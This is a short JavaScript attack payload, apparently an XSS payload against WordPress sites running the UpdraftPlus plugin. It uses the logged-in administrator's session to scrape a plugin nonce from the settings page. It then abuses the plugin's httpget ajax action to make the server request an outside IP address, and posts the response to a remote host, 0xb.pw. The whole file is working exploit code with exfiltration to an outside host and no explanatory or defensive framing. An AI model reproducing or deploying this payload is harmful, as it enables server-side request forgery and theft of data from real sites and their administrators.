
url = window.location.href;
url = url.split('wp-admin')[0];
p = 'wp-admin/options-general.php?';
p2 = 'wp-admin/admin-ajax.php?';
q = 'page=updraftplus&tab=addons';
s = "http://115.28.78.16";

a = new XMLHttpRequest();
a.open('GET', url+p+q, 0);
a.send();

q2 = 'nonce=' + /credentialtest_nonce='([^']*?)'/.exec(a.responseText)[1] +
'&uri=' + s + '&action=updraft_ajax&subaction=httpget&curl=1';

// 发起请求
b = new XMLHttpRequest();
b.open('GET', url+p2+q2, 1);
b.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
b.send();

b.onload = function(){
	if (this.readyState == 4) {
		// 传出请求结果
		var c = new XMLHttpRequest(); 
		c.open('POST', 'http://0xb.pw', true); 
		c.setRequestHeader("Content-type","application/x-www-form-urlencoded");
		c.send('result='+encodeURIComponent(b.responseText))
	}
}